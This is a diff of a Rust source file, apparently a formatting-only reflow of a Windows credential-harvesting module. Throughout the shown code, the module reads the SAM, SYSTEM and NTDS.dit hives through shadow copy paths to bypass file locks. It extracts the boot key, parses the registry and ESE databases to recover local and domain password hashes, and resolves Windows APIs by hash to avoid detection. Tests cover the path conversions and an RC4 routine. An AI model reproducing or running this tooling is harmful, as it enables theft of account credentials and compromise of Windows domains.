@@ -44,11 +44,11 @@ use std::os::windows::ffi::OsStrExt;
 use std::ptr;
 
 use anyhow::{anyhow, bail, Context, Result};
-use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
+use tracing::{debug, info, warn};
 
-use crate::win_types::{BOOL, DWORD, FALSE, LPVOID, TRUE};
 use crate::win_types::HANDLE;
+use crate::win_types::{BOOL, DWORD, FALSE, LPVOID, TRUE};
 
 use crate::pe_resolve_macros::hash_str_const;
 use crate::win_types::{PROCESS_INFORMATION, STARTUPINFOW};
@@ -132,8 +132,8 @@ const READ_BUFFER_SIZE: usize = 65536;
 
 // kernel32.dll wide string for module hash
 const KERNEL32_DLL_W: &[u16] = &[
-    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
-    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 
 const HASH_KERNEL32_DLL: u32 = crate::pe_resolve_macros::hash_wstr_const(KERNEL32_DLL_W);
@@ -149,16 +149,16 @@ const HASH_GETLASTERROR: u32 = hash_str_const(b"GetLastError\0");
 // ═══════════════════════════════════════════════════════════════════════════
 
 type FnCreateProcessW = unsafe extern "system" fn(
-    *mut u16,                 // lpApplicationName
-    *mut u16,                 // lpCommandLine
+    *mut u16,                  // lpApplicationName
+    *mut u16,                  // lpCommandLine
     *mut std::os::raw::c_void, // lpProcessAttributes
     *mut std::os::raw::c_void, // lpThreadAttributes
-    i32,                      // bInheritHandles
-    u32,                      // dwCreationFlags
+    i32,                       // bInheritHandles
+    u32,                       // dwCreationFlags
     *mut std::os::raw::c_void, // lpEnvironment
-    *mut u16,                 // lpCurrentDirectory
-    *mut STARTUPINFOW,        // lpStartupInfo
-    *mut PROCESS_INFORMATION, // lpProcessInformation
+    *mut u16,                  // lpCurrentDirectory
+    *mut STARTUPINFOW,         // lpStartupInfo
+    *mut PROCESS_INFORMATION,  // lpProcessInformation
 ) -> i32;
 
 type FnCreatePipe = unsafe extern "system" fn(
@@ -337,10 +337,7 @@ impl VssDiscovery {
         let mut copies = Vec::new();
 
         for index in 1..=MAX_SHADOW_INDEX {
-            let device_path = format!(
-                r"\??\GLOBALROOT\Device\HarddiskVolumeShadowCopy{}",
-                index
-            );
+            let device_path = format!(r"\??\GLOBALROOT\Device\HarddiskVolumeShadowCopy{}", index);
             if Self::probe_device_path(&device_path) {
                 debug!("Found shadow copy at index {}", index);
                 copies.push(ShadowCopy {
@@ -550,9 +547,8 @@ impl VssFileReader {
         let vss_path = Self::path_to_vss_path(original_path, &shadow.device_object);
         debug!("Attempting VSS read: {} -> {}", original_path, vss_path);
 
-        let data = Self::read_file_nt(&vss_path).with_context(|| {
-            format!("Failed to read {} via VSS path", vss_path)
-        })?;
+        let data = Self::read_file_nt(&vss_path)
+            .with_context(|| format!("Failed to read {} via VSS path", vss_path))?;
 
         Ok(VssFileResult {
             vss_path,
@@ -814,10 +810,8 @@ impl VssCredentialHarvester {
     /// file-lock restrictions, then parses the SAM hive.
     pub fn harvest_sam_via_vss() -> Result<SamDump> {
         // Read SYSTEM hive first to extract the boot key.
-        let system_data = VssFileReader::read_file_via_vss(
-            r"C:\Windows\System32\config\SYSTEM",
-        )
-        .context("Failed to read SYSTEM hive via VSS")?;
+        let system_data = VssFileReader::read_file_via_vss(r"C:\Windows\System32\config\SYSTEM")
+            .context("Failed to read SYSTEM hive via VSS")?;
 
         let boot_key = Self::extract_boot_key(&system_data.data)
             .context("Failed to extract boot key from SYSTEM hive")?;
@@ -825,13 +819,11 @@ impl VssCredentialHarvester {
         debug!("Extracted boot key: {}", hex_encode(&boot_key));
 
         // Read SAM hive via VSS.
-        let sam_data = VssFileReader::read_file_via_vss(
-            r"C:\Windows\System32\config\SAM",
-        )
-        .context("Failed to read SAM hive via VSS")?;
+        let sam_data = VssFileReader::read_file_via_vss(r"C:\Windows\System32\config\SAM")
+            .context("Failed to read SAM hive via VSS")?;
 
-        let entries = Self::parse_sam_hive(&sam_data.data, &boot_key)
-            .context("Failed to parse SAM hive")?;
+        let entries =
+            Self::parse_sam_hive(&sam_data.data, &boot_key).context("Failed to parse SAM hive")?;
 
         info!("Harvested {} SAM entries via VSS", entries.len());
 
@@ -847,10 +839,8 @@ impl VssCredentialHarvester {
     /// and parses the ESE database to extract domain user hashes.
     pub fn harvest_ntds_via_vss() -> Result<NtdsDump> {
         // Read SYSTEM hive for boot key (small file — buffered read is fine).
-        let system_data = VssFileReader::read_file_via_vss(
-            r"C:\Windows\System32\config\SYSTEM",
-        )
-        .context("Failed to read SYSTEM hive via VSS")?;
+        let system_data = VssFileReader::read_file_via_vss(r"C:\Windows\System32\config\SYSTEM")
+            .context("Failed to read SYSTEM hive via VSS")?;
 
         let boot_key = Self::extract_boot_key(&system_data.data)
             .context("Failed to extract boot key from SYSTEM hive")?;
@@ -861,13 +851,10 @@ impl VssCredentialHarvester {
         // grows the buffer in VSS_STREAM_CHUNK_SIZE increments.
         let mut ntds_buf = Vec::with_capacity(VSS_STREAM_CHUNK_SIZE);
         let (total_bytes, _vss_path, shadow_index) =
-            VssFileReader::read_file_via_vss_chunked(
-                r"C:\Windows\NTDS\NTDS.dit",
-                |chunk| {
-                    ntds_buf.extend_from_slice(chunk);
-                    Ok(())
-                },
-            )
+            VssFileReader::read_file_via_vss_chunked(r"C:\Windows\NTDS\NTDS.dit", |chunk| {
+                ntds_buf.extend_from_slice(chunk);
+                Ok(())
+            })
             .context("Failed to stream NTDS.dit via VSS")?;
 
         debug!(
@@ -875,8 +862,8 @@ impl VssCredentialHarvester {
             total_bytes, shadow_index
         );
 
-        let entries = Self::parse_ntds_dit(&ntds_buf, &boot_key)
-            .context("Failed to parse NTDS.dit")?;
+        let entries =
+            Self::parse_ntds_dit(&ntds_buf, &boot_key).context("Failed to parse NTDS.dit")?;
 
         info!("Harvested {} NTDS entries via VSS", entries.len());
 
@@ -917,9 +904,7 @@ impl VssCredentialHarvester {
         scrambled.extend_from_slice(&data[..4]);
 
         // Descramble using the known permutation.
-        const DESCRAMBLE: [usize; 16] = [
-            8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7,
-        ];
+        const DESCRAMBLE: [usize; 16] = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7];
         let mut boot_key = vec![0u8; 16];
         for (i, &src_idx) in DESCRAMBLE.iter().enumerate() {
             boot_key[i] = scrambled[src_idx];
@@ -985,11 +970,7 @@ impl VssCredentialHarvester {
     }
 
     /// Parse a single user's V value to extract password hashes.
-    fn parse_user_v_value(
-        rid: u32,
-        v_data: &[u8],
-        hboot_key: &[u8],
-    ) -> Option<SamEntry> {
+    fn parse_user_v_value(rid: u32, v_data: &[u8], hboot_key: &[u8]) -> Option<SamEntry> {
         // The V value layout (relative offsets):
         // 0x0C: offset to user name (relative to 0xCC)
         // 0x10: length of user name
@@ -1048,7 +1029,8 @@ impl VssCredentialHarvester {
         let ese = EseDatabase::parse(ntds_data)?;
 
         // Find the datatable.
-        let datatable = ese.find_table("datatable")
+        let datatable = ese
+            .find_table("datatable")
             .ok_or_else(|| anyhow!("datatable not found in NTDS.dit"))?;
 
         let mut entries = Vec::new();
@@ -1229,10 +1211,7 @@ fn run_command_capture_output(program: &str, args: &str) -> Result<String> {
         )
     } == FALSE
     {
-        bail!(
-            "CreatePipe failed: {}",
-            unsafe { (api.get_last_error)() }
-        );
+        bail!("CreatePipe failed: {}", unsafe { (api.get_last_error)() });
     }
 
     // Make the read handle non-inheritable using NtSetInformationObject.
@@ -1274,9 +1253,12 @@ fn run_command_capture_output(program: &str, args: &str) -> Result<String> {
 
     if created == FALSE {
         unsafe { (api.close_handle)(stdout_read) };
-        bail!("CreateProcessW failed for {} {}: {}", program, args, unsafe {
-            (api.get_last_error)()
-        });
+        bail!(
+            "CreateProcessW failed for {} {}: {}",
+            program,
+            args,
+            unsafe { (api.get_last_error)() }
+        );
     }
 
     // Close thread handle immediately.
@@ -1538,8 +1520,7 @@ impl<'a> RegistryKey<'a> {
                         break;
                     }
 
-                    let subkey_offset =
-                        read_u32_le(&self.data[entry_off..entry_off + 4]) as usize;
+                    let subkey_offset = read_u32_le(&self.data[entry_off..entry_off + 4]) as usize;
                     let subkey_abs = 0x1000 + subkey_offset;
 
                     if subkey_abs + 0x50 > self.data.len() {
@@ -1598,8 +1579,7 @@ impl<'a> RegistryKey<'a> {
                         break;
                     }
 
-                    let subkey_offset =
-                        read_u32_le(&self.data[entry_off..entry_off + 4]) as usize;
+                    let subkey_offset = read_u32_le(&self.data[entry_off..entry_off + 4]) as usize;
                     let subkey_abs = 0x1000 + subkey_offset;
 
                     if subkey_abs + 0x50 > self.data.len() {
@@ -1721,8 +1701,7 @@ impl<'a> RegistryKey<'a> {
                 continue;
             }
 
-            let vname =
-                String::from_utf8_lossy(&self.data[vname_start..vname_start + vname_len]);
+            let vname = String::from_utf8_lossy(&self.data[vname_start..vname_start + vname_len]);
 
             if vname.eq_ignore_ascii_case(value_name) {
                 return self.extract_value_data(value_abs);
@@ -1816,11 +1795,7 @@ impl<'a> RegistryKey<'a> {
         // The LSA key fragments are actually hex-encoded UTF-16 strings.
         // Decode the UTF-16 class name to get the hex string, then convert to bytes.
         let class_utf16: Vec<u16> = (0..class_len / 2)
-            .map(|i| {
-                read_u16_le(
-                    &self.data[class_abs + i * 2..class_abs + i * 2 + 2],
-                )
-            })
+            .map(|i| read_u16_le(&self.data[class_abs + i * 2..class_abs + i * 2 + 2]))
             .collect();
 
         let hex_str = String::from_utf16_lossy(&class_utf16);
@@ -1874,7 +1849,9 @@ impl<'a> RegistryKey<'a> {
                 continue;
             }
 
-            names.push(String::from_utf8_lossy(&self.data[name_start..name_start + name_len]).to_string());
+            names.push(
+                String::from_utf8_lossy(&self.data[name_start..name_start + name_len]).to_string(),
+            );
         }
 
         names
@@ -1965,7 +1942,11 @@ impl<'a> EseDatabase<'a> {
             }
         };
 
-        debug!("ESE database: {} bytes, page size {}", data.len(), page_size);
+        debug!(
+            "ESE database: {} bytes, page size {}",
+            data.len(),
+            page_size
+        );
 
         Ok(Self { data, page_size })
     }
@@ -2346,8 +2327,12 @@ impl<'a> EseTable<'a> {
                                 EseDatabase::read_ese_var_length(&body[data_offset..]);
                             let content_start = data_offset + header_consumed;
 
-                            if content_start + data_len <= body.len() && data_len > 0 && data_len < 0x10000 {
-                                columns.push((tag_id, &body[content_start..content_start + data_len]));
+                            if content_start + data_len <= body.len()
+                                && data_len > 0
+                                && data_len < 0x10000
+                            {
+                                columns
+                                    .push((tag_id, &body[content_start..content_start + data_len]));
                                 pos = content_start + data_len;
                             } else {
                                 // Heuristic: scan until next tag or max 512 bytes.
@@ -2371,7 +2356,8 @@ impl<'a> EseTable<'a> {
                                     end += 1;
                                 }
                                 if end > 3 {
-                                    columns.push((tag_id, &body[data_offset + 3..data_offset + end]));
+                                    columns
+                                        .push((tag_id, &body[data_offset + 3..data_offset + end]));
                                 }
                                 pos = data_offset + end;
                             }
@@ -2432,8 +2418,8 @@ impl<'a> EseRow<'a> {
             return None;
         }
         // Interpret as UTF-16LE pairs.
-        let u16_iter = (0..data.len() / 2)
-            .map(|i| u16::from_le_bytes([data[i * 2], data[i * 2 + 1]]));
+        let u16_iter =
+            (0..data.len() / 2).map(|i| u16::from_le_bytes([data[i * 2], data[i * 2 + 1]]));
         let s: String = char::decode_utf16(u16_iter)
             .filter_map(|c| c.ok())
             .collect();
@@ -2579,10 +2565,7 @@ mod tests {
     #[test]
     fn test_path_to_vss_path_c_drive() {
         let device = r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1";
-        let result = VssFileReader::path_to_vss_path(
-            r"C:\Windows\System32\config\SAM",
-            device,
-        );
+        let result = VssFileReader::path_to_vss_path(r"C:\Windows\System32\config\SAM", device);
         assert_eq!(
             result,
             r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM"
@@ -2592,10 +2575,7 @@ mod tests {
     #[test]
     fn test_path_to_vss_path_no_drive() {
         let device = r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5";
-        let result = VssFileReader::path_to_vss_path(
-            r"\Windows\temp\test.txt",
-            device,
-        );
+        let result = VssFileReader::path_to_vss_path(r"\Windows\temp\test.txt", device);
         assert_eq!(
             result,
             r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\temp\test.txt"
@@ -2605,10 +2585,7 @@ mod tests {
     #[test]
     fn test_path_to_vss_path_d_drive() {
         let device = r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2";
-        let result = VssFileReader::path_to_vss_path(
-            r"D:\data\secrets.txt",
-            device,
-        );
+        let result = VssFileReader::path_to_vss_path(r"D:\data\secrets.txt", device);
         assert_eq!(
             result,
             r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\data\secrets.txt"
@@ -2618,21 +2595,15 @@ mod tests {
     #[test]
     fn test_parse_shadow_index() {
         assert_eq!(
-            parse_shadow_index(
-                r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy42"
-            ),
+            parse_shadow_index(r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy42"),
             Some(42)
         );
         assert_eq!(
-            parse_shadow_index(
-                r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"
-            ),
+            parse_shadow_index(r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"),
             Some(1)
         );
         assert_eq!(
-            parse_shadow_index(
-                r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy"
-            ),
+            parse_shadow_index(r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy"),
             None
         );
         assert_eq!(parse_shadow_index("no shadow copy here"), None);
@@ -2726,10 +2697,7 @@ Contents of shadow copy set ID: {set2}
         let plaintext = b"Plaintext";
         let ciphertext = rc4_decrypt(key, plaintext);
         // Known RC4 test vector: key="Key", plaintext="Plaintext" → BBF316E8D940AF0AD3
-        assert_eq!(
-            hex_encode(&ciphertext),
-            "bbf316e8d940af0ad3"
-        );
+        assert_eq!(hex_encode(&ciphertext), "bbf316e8d940af0ad3");
     }
 
     #[test]
@@ -2780,10 +2748,7 @@ Contents of shadow copy set ID: {set2}
     #[test]
     fn test_vss_path_conversion_ntds() {
         let device = r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3";
-        let result = VssFileReader::path_to_vss_path(
-            r"C:\Windows\NTDS\NTDS.dit",
-            device,
-        );
+        let result = VssFileReader::path_to_vss_path(r"C:\Windows\NTDS\NTDS.dit", device);
         assert_eq!(
             result,
             r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\NTDS.dit"
